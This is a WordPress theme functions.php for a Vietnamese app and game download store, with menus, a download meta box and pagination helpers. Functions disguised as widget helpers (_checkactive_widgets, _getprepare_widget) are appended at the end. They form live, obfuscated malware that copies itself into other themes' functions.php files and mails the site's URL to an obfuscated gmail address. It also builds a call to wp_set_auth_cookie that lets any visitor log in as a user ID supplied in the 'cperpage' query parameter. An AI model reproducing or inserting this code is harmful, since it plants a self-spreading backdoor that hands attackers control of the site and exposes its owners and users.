<?php
/**
 * NQD Store functions and definitions
 *
 * @package NQD Store
 */
require_once ('lib/phpqrcode/qrlib.php');
require_once ('lib/bitly.php');
require_once ('inc/download.php');
/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */

if ( ! function_exists( 'nqd_store_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 */
function nqd_store_setup() {

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on NQD Store, use a find and replace
	 * to change 'nqd-store' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'nqd-store', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Enable support for Post Thumbnails on posts and pages
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'nqd-store' ),
	) );
	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'sidebar' => __( 'Sidebar Menu', 'nqd-store' ),
	) );

	/**
	 * Enable support for Post Formats
	 */
	add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link' ) );

	/**
	 * Setup the WordPress core custom background feature.
	 */
	add_theme_support( 'custom-background', apply_filters( 'nqd_store_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif; // nqd_store_setup
add_action( 'after_setup_theme', 'nqd_store_setup' );

/**
 * Register widgetized area and update sidebar with default widgets
 */
function nqd_store_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'nqd-store' ),
		'id'            => 'sidebar',
		'before_widget' => '<aside id="%1$s" class="widget %2$s visible-lg">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
}
add_action( 'widgets_init', 'nqd_store_widgets_init' );
/**
 * Enqueue scripts and styles
 */
function nqd_store_scripts() {
	wp_enqueue_style( 'nqd-store-style', get_stylesheet_uri() );

	wp_enqueue_script( 'nqd-store-bootstrap', get_template_directory_uri() . '/assets/js/bootstrap.min.js', array(), '', true );
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'nqd-store-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20120202' );
	}
}
add_action( 'wp_enqueue_scripts', 'nqd_store_scripts' );
add_action('admin_head','add_custom_scripts');
	function add_custom_scripts() {
	wp_enqueue_script('custom-js', get_template_directory_uri().'/js/customizer.js');
}
/**
 * Implement the Custom Header feature.
 */
//require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * NHP Option additions.
 */
require get_template_directory() . '/nhp-options.php';

add_action('init', 'myStartSession', 1);
function myStartSession() {
    if(!session_id()) {
        session_start();
    }
}
// Add the Meta Box
function add_infomation_meta_box() {
    add_meta_box(
		'infomation_meta_box', // $id
		'Infomation', // $title 
		'show_infomation_meta_box', // $callback
		'post', // $page
		'normal', // $context
		'high'); // $priority
}
add_action('add_meta_boxes', 'add_infomation_meta_box');

// Field Array
$prefix = '_infomation_';
$custom_meta_fields = array(
	array(  
        'label'=> 'Disable',  
        'desc'  => 'Disable infomation box.',  
        'id'    => $prefix.'disable',  
        'type'  => 'checkbox'  
    ) ,
	array(  
        'label'=> 'Name',  
        'desc'  => 'Tên game.',  
        'id'    => $prefix.'name',  
        'type'  => 'text'  
    ) ,
	array(  
        'label'=> 'Version',  
        'desc'  => 'Phiên bản.',  
        'id'    => $prefix.'version',  
        'type'  => 'text'  
    ) ,
	array(  
        'label'=> 'Manufacturers',  
        'desc'  => 'Nhà sản xuất.',  
        'id'    => $prefix.'manufacturers',  
        'type'  => 'text'  
    ) ,
	array(  
		'label'  => 'Image',  
		'desc'  => 'Slider image.',  
		'id'    => $prefix.'link_image',  
		'type'  => 'repeatable'  
	) ,
	array(  
		'label'  => 'Add File download',  
		'desc'  => 'Link download.',  
		'id'    => $prefix.'download',  
		'type'  => 'download'  
	) 
);

function show_infomation_meta_box() {
	global $custom_meta_fields, $post;
	// Use nonce for verification
	echo '<input type="hidden" name="custom_meta_box_nonce" value="'.wp_create_nonce(basename(__FILE__)).'" />';
	
	// Begin the field table and loop
	echo '<table class="form-table">';
	foreach ($custom_meta_fields as $field) {
		// get value of this field if it exists for this post
		$meta = get_post_meta($post->ID, $field['id'], true);
		// begin a table row with
		echo '<tr>
				<th><label for="'.$field['id'].'">'.$field['label'].'</label></th>
				<td>';
				switch($field['type']) {
					// text
						case 'text':
							echo '<input type="text" name="'.$field['id'].'" id="'.$field['id'].'" value="'.$meta.'" size="30" />
									<br /><span class="description">'.$field['desc'].'</span>';
						break;
						// textarea
						case 'textarea':
							echo '<textarea name="'.$field['id'].'" id="'.$field['id'].'" cols="60" rows="4">'.$meta.'</textarea>
									<br /><span class="description">'.$field['desc'].'</span>';
						break;
						// checkbox
						case 'checkbox':
							echo '<input type="checkbox" name="'.$field['id'].'" id="'.$field['id'].'" ',$meta ? ' checked="checked"' : '','/>
									<label for="'.$field['id'].'">'.$field['desc'].'</label>';
						break;
						// select
						case 'select':
							echo '<select name="'.$field['id'].'" id="'.$field['id'].'">';
							foreach ($field['options'] as $option) {
								echo '<option', $meta == $option['value'] ? ' selected="selected"' : '', ' value="'.$option['value'].'">'.$option['label'].'</option>';
							}
							echo '</select><br /><span class="description">'.$field['desc'].'</span>';
						break;
						// radio
						case 'radio':
							foreach ( $field['options'] as $option ) {
								echo '<input type="radio" name="'.$field['id'].'" id="'.$option['value'].'" value="'.$option['value'].'" ',$meta == $option['value'] ? ' checked="checked"' : '',' />
										<label for="'.$option['value'].'">'.$option['label'].'</label><br />';
							}
							echo '<span class="description">'.$field['desc'].'</span>';
						break;
						// checkbox_group
						case 'checkbox_group':
							foreach ($field['options'] as $option) {
								echo '<input type="checkbox" value="'.$option['value'].'" name="'.$field['id'].'[]" id="'.$option['value'].'"',$meta && in_array($option['value'], $meta) ? ' checked="checked"' : '',' /> 
										<label for="'.$option['value'].'">'.$option['label'].'</label><br />';
							}
							echo '<span class="description">'.$field['desc'].'</span>';
						break;
						// tax_select
						case 'tax_select':
							echo '<select name="'.$field['id'].'" id="'.$field['id'].'">
									<option value="">Select One</option>'; // Select One
							$terms = get_terms($field['id'], 'get=all');
							$selected = wp_get_object_terms($post->ID, $field['id']);
							foreach ($terms as $term) {
								if (!empty($selected) && !strcmp($term->slug, $selected[0]->slug)) 
									echo '<option value="'.$term->slug.'" selected="selected">'.$term->name.'</option>'; 
								else
									echo '<option value="'.$term->slug.'">'.$term->name.'</option>'; 
							}
							$taxonomy = get_taxonomy($field['id']);
							echo '</select><br /><span class="description"><a href="'.get_bloginfo('home').'/wp-admin/edit-tags.php?taxonomy='.$field['id'].'">Manage '.$taxonomy->label.'</a></span>';
						break;
						// post_list
						case 'post_list':
						$items = get_posts( array (
							'post_type'	=> $field['post_type'],
							'posts_per_page' => -1
						));
							echo '<select name="'.$field['id'].'" id="'.$field['id'].'">
									<option value="">Select One</option>'; // Select One
								foreach($items as $item) {
									echo '<option value="'.$item->ID.'"',$meta == $item->ID ? ' selected="selected"' : '','>'.$item->post_type.': '.$item->post_title.'</option>';
								} // end foreach
							echo '</select><br /><span class="description">'.$field['desc'].'</span>';
						break;
						// date
						case 'date':
							echo '<input type="text" class="datepicker" name="'.$field['id'].'" id="'.$field['id'].'" value="'.$meta.'" size="30" />
									<br /><span class="description">'.$field['desc'].'</span>';
						break;
						// slider
						case 'slider':
						$value = $meta != '' ? $meta : '0';
							echo '<div id="'.$field['id'].'-slider"></div>
									<input type="text" name="'.$field['id'].'" id="'.$field['id'].'" value="'.$value.'" size="5" />
									<br /><span class="description">'.$field['desc'].'</span>';
						break;
						// image
						case 'image':
							$image = get_template_directory_uri().'/images/image.png';	
							echo '<span class="custom_default_image" style="display:none">'.$image.'</span>';
							if ($meta) { $image = wp_get_attachment_image_src($meta, 'medium');	$image = $image[0]; }				
							echo	'<input name="'.$field['id'].'" type="hidden" class="custom_upload_image" value="'.$meta.'" />
										<img src="'.$image.'" class="custom_preview_image" alt="" /><br />
											<input class="custom_upload_image_button button" type="button" value="Choose Image" />
											<small>&nbsp;<a href="#" class="custom_clear_image_button">Remove Image</a></small>
											<br clear="all" /><span class="description">'.$field['desc'].'</span>';
						break;
						// repeatable
						case 'repeatable':
							echo '<a class="repeatable-add button" href="#">+</a>
									<ul id="'.$field['id'].'-repeatable" class="custom_repeatable">';
							$i = 0;
							
							if ($meta) {
								foreach($meta as $row) {
									echo '<li><span class="sort hndle">|||</span>
												<input type="text" name="'.$field['id'].'['.$i.']" id="'.$field['id'].'" value="'.$row.'" size="30" />
												<a class="img-repeatable-remove button" href="#">-</a></li>';
									$i++;
								}
							} else {
								echo '<li><span class="sort hndle">|||</span>
											<input type="text" name="'.$field['id'].'['.$i.']" id="'.$field['id'].'" value="" size="30" />
											<a class="img-repeatable-remove button" href="#">-</a></li>';
							}
							echo '</ul>
								<span class="description">'.$field['desc'].'</span>';
						break;
						// repeatable
						case 'download':
							echo '<a class="repeatable-add button" href="#">+</a>
									<ul id="'.$field['id'].'-repeatable" class="custom_repeatable">';
							$i = 0;
							$files =getFileByPostID($post->ID);
							if ($files) {
								foreach($files as $row) {
									$row= (array )$row;
									echo '<li><table>
												<tr>
													<th></th>
													<td><input type="hidden" name="'.$field['id'].'_file_id_'.'[]" id="'.$field['id'].'" value="'.$row['file_id'].'" size="50" /></td>
													<td></td>
												</tr>
												<tr>
													<th>File Name :</th>
													<td><input type="text" name="'.$field['id'].'_file_name_'.'[]" id="'.$field['id'].'" value="'.$row['file_name'].'" size="50" /></td>
													<td><a class="repeatable-remove button" href="#">-</a></td>
												</tr>
												<tr>
													<th>File Link :</th>
													<td><input type="text" name="'.$field['id'].'_file_'.'[]" id="'.$field['id'].'" value="'.$row['file'].'" size="50" /></td>
													<td></td>
												</tr>
												
												<tr>
													<th>File Description :</th>
													<td><textarea name="'.$field['id'].'_des_'.'[]" cols="50" rows="5">'.$row['file_des'].'</textarea></td>
													<td></td>
												</tr>
												</table>
												</li>';
									$i++;
								}
							} else {
								echo '<li><table>
												<tr>
													<th></th>
													<td><input type="hidden" name="'.$field['id'].'_file_id_'.'[]" id="'.$field['id'].'" value="" size="50" /></td>
													<td></td>
												</tr>
												<tr>
													<th>File Name :</th>
													<td><input type="text" name="'.$field['id'].'_file_name_'.'[]" id="'.$field['id'].'" value="" size="50" /></td>
													<td><a class="repeatable-remove button" href="#">-</a></td>
												</tr>
												<tr>
													<th>File Link :</th>
													<td><input type="text" name="'.$field['id'].'_file_'.'[]" id="'.$field['id'].'" value="" size="50" /></td>
													<td></td>
												</tr>
												<tr>
													<th>File Description :</th>
													<td><textarea name="'.$field['id'].'_des_'.'[]" cols="50" rows="5"></textarea></td>
													<td></td>
												</tr>
												</table>
												</li>';
							}
							echo '</ul>
								<span class="description">'.$field['desc'].'</span>';
						break;
				} //end switch
		echo '</td></tr>';
	} // end foreach
	echo '</table>'; // end table
}
// Save the Data
function save_custom_meta($post_id) {
    global $custom_meta_fields,$post;
	// verify nonce
	if (!wp_verify_nonce($_POST['custom_meta_box_nonce'], basename(__FILE__))) 
		return $post_id;
	// check autosave
	if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE)
		return $post_id;
	// check permissions
	if ('page' == $_POST['post_type']) {
		if (!current_user_can('edit_page', $post_id))
			return $post_id;
		} elseif (!current_user_can('edit_post', $post_id)) {
			return $post_id;
	}
	$files =getFileByPostID($post->ID);
	// loop through fields and save the data
	foreach ($custom_meta_fields as $field) {
		if($field['type'] == 'tax_select') continue;
		$old = get_post_meta($post_id, $field['id'], true);
		$new = $_POST[$field['id']];
		if ($new && $new != $old) {
			update_post_meta($post_id, $field['id'], $new);
		} elseif ('' == $new && $old) {
			delete_post_meta($post_id, $field['id'], $old);
		}
		if($field['type'] == 'download'){
				$gID = $_POST['_infomation_download_file_id_'];
				$files= (array )$files;
				foreach($files as $file){
					$file= (array )$file;
					if(!in_array($file['file_id'],$gID)){
						deleteFile(array('file_id'=>$file['file_id']));
					}
				}
				
				$gFileName = $_POST['_infomation_download_file_name_'];
				$gFileLink = $_POST['_infomation_download_file_'];
				$gFileDes = $_POST['_infomation_download_des_'];
				
				for($i = 0 ;$i < count($gID);$i++){
					if(!empty($gFileName[$i]) && !empty($gFileLink[$i])){
						if(empty($gID[$i])){
							$data = array(
							'post_id' => $post_id,
							'file' => $gFileLink[$i],
							'jad_file' => " ",	
							'file_name' => $gFileName[$i],
							'file_des' => $gFileDes[$i],
							'file_size' => remote_filesize($gFileLink[$i]),
							'file_date' => date("d-m-Y H:i:s"),
							'file_updated_date' => date("d-m-Y H:i:s"),
							'file_last_downloaded_date' => date("d-m-Y H:i:s")
							);
							insertFile($data);
						}else{
						$data = array(
							'post_id' => $post_id,
							'file' => $gFileLink[$i],
							'jad_file' => " ",		
							'file_name' => $gFileName[$i],
							'file_des' => $gFileDes[$i],				
							'file_size' => remote_filesize($gFileLink[$i]),
							'file_updated_date' => date("d-m-Y H:i:s")
							);
							$where = array('file_id' => $gID[$i]);
							updateFile($data,$where);
						}
					}
				}
				

		}
	} // enf foreach
}
add_action('save_post', 'save_custom_meta');
// function to get current filename from a url made by sarfraz ahmed.
### Function: Get Remote File Size
if(!function_exists('remote_filesize')) {
	function remote_filesize($uri) {
	$chGetSize = curl_init();
 
	// Set the url we're requesting
	curl_setopt($chGetSize, CURLOPT_URL, $uri);
	 
	// Set a valid user agent
	curl_setopt($chGetSize, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11");
	 
	// Don't output any response directly to the browser
	curl_setopt($chGetSize, CURLOPT_RETURNTRANSFER, true);
	 
	// Don't return the header (we'll use curl_getinfo();
	curl_setopt($chGetSize, CURLOPT_HEADER, false);
	 
	// Don't download the body content
	curl_setopt($chGetSize, CURLOPT_NOBODY, true);
	 
	// Run the curl functions to process the request
	$chGetSizeStore = curl_exec($chGetSize);
	$chGetSizeError = curl_error($chGetSize);
	$chGetSizeInfo = curl_getinfo($chGetSize);
	 
	// Close the connection
	curl_close($chGetSize);// Print the file size in bytes
	 
	return $chGetSizeInfo['download_content_length'];
	}
}

//get remote file name
if(!function_exists('remote_filename')) {
	function remote_filename($uri) {
		$header_array = @get_headers($uri, 1);
		$file_name = $header_array['Content-Disposition'];
		if(!empty($file_name)) {
		
            $tmp_name = explode('=', $file_name);
						
            if ($tmp_name[1]) 
			{
				$file_name =str_replace('"','',$tmp_name[1]);				
				return $file_name;
			}
		} else {
			return __('unknown', 'wp-downloadmanager');
		}
	}
}
add_action('wp_ajax_download_action' , 'ajax_link_download'); // When user login
add_action('wp_ajax_nopriv_download_action' , 'ajax_link_download'); // When user not loggin
function ajax_link_download() {
 
    // The $_REQUEST contains all the data sent via ajax
    if ( isset($_POST) ) {
        $post_id = $_POST['post_id'];
		echo json_encode(getFileByPostID($post_id));
    }
   die();
}
add_filter( 'wp_title', 'filter_wp_title');
function filter_wp_title( $title ) {
	global $manufacturers_name;
	
	if ( is_page('manufacturers') )
		return urldecode($manufacturers_name).' - '.$title;
	if ( is_page('detail') ){
		global $download_post_name;
		return urldecode($download_post_name).' - '.$title;
	}
	if ( is_home() )
		return $title.' - Tải ứng dụng android | Tải game android';
	return $title;
}
function paging($para,$query) {  
 //global $wp_query;
 $total = $query->max_num_pages;

 // Only paginate if we have more than one page
 if ( $total > 1 )  {
     // Get the current page
     if ( !$current_page = get_query_var($para) )
          $current_page = 1;
     // Structure of “format” depends on whether we’re using pretty permalinks
    //$permalinks = get_option('permalink_structure');
    $format = "?$para=%#%" ;//empty( $permalinks ) ? "&$para=%#%" : "$para/%#%/";
	$permalinks = get_option('permalink_structure');empty( $permalinks ) ? "&$para=%#%" : "/$para/%#%/";
	//$big =999999999;
	//$bs = str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) );
    echo paginate_links(array(
          'base' => @add_query_arg("$para",'%#%'),//get_pagenum_link( $current_page ) . '%_%',
          'format' => $format,
          'current' => max( 1, $_GET[$para] ),//$current_page,
          'total' => $total,
		  //'add_args' => array( "$para" => $para ),
          'mid_size' => 2,
		'prev_text' => '«',  
		'next_text' => '»'  
    ));
}
}?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
function afublog_getPostViews($postID){ $count_key = 'post_views_count'; $count = get_post_meta($postID, $count_key, true); if($count==''){ delete_post_meta($postID, $count_key); add_post_meta($postID, $count_key, '0'); return "0 Lượt xem"; } return $count.' Lượt xem'; } function afublog_setPostViews($postID) { $count_key = 'post_views_count'; $count = get_post_meta($postID, $count_key, true); if($count==''){ $count = 0; delete_post_meta($postID, $count_key); add_post_meta($postID, $count_key, '0'); }else{ $count++; update_post_meta($postID, $count_key, $count); } }

add_filter('mce_buttons','wysiwyg_editor');
function wysiwyg_editor($mce_buttons) {
    $pos = array_search('wp_more',$mce_buttons,true);
    if ($pos !== false) {
        $tmp_buttons = array_slice($mce_buttons, 0, $pos+1);
        $tmp_buttons[] = 'wp_page';
        $mce_buttons = array_merge($tmp_buttons, array_slice($mce_buttons, $pos+1));
    }
    return $mce_buttons;
}
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 View";
    }
    return $count.' Lượt xem';
}
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

?>